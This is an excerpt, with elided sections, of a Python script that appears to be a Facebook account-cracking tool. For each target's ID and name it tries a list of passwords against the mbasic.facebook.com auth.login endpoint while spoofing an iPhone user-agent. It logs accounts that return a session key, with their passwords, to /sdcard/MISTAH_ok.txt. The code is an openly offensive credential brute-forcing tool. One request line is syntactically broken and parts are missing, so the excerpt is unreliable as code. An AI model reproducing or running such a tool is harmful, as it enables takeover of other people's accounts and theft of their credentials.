...
#----[pran links]-----
kkk = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/40.0 Mobile/12F69 Safari/600.1.4'}
...
lll = ("https://mbasic.facebook.com/method/auth.login")
#----[remover]-----
...
update = requests.get(https://mbasic.facebook.com).text
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[MISTAH] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[MISTAH-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/MISTAH_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/MISTAH_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
